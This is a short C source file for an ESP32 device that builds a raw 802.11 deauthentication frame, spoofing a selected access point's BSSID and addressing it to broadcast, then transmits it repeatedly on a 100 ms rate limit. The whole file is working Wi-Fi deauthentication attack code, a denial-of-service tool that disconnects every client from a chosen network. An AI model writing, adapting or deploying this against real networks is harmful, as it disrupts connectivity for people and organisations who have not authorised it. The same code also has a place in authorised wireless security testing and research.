#include "deauth.h"
#include "target.h"
#include "comm_uart.h"
#include <esp_wifi.h>
#include <string.h>
#include "config.h"

#define DEAUTH_RATE_LIMIT_MS 100

void run_deauth() {
    static uint32_t last_send_time = 0;

    if (!deauthing || millis() - last_send_time < DEAUTH_RATE_LIMIT_MS) return;
    
    if (!current_target.selected) return;

    uint8_t deauthPacket[26] = {
        0xC0, 0x00, 0x3A, 0x01,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,
        0x01, 0x00
    };

    memcpy(&deauthPacket[10], current_target.bssid, 6);
    memcpy(&deauthPacket[16], current_target.bssid, 6);

    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    last_send_time = millis();
}